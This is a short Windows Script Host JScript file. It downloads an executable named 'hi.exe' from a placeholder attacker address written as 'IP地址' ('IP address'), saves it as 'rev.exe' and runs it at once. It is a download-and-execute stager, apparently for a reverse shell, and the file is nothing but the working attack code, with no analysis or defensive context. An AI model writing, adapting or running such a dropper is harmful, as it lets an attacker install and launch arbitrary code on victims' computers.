var url = "http://IP地址/payload/hi.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200)
{
	var Stream = WScript.CreateObject('ADODB.Stream');
	Stream.Open();
	Stream.Type = 1;
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;

	Stream.SaveToFile("rev.exe", 2);
	Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("rev.exe");
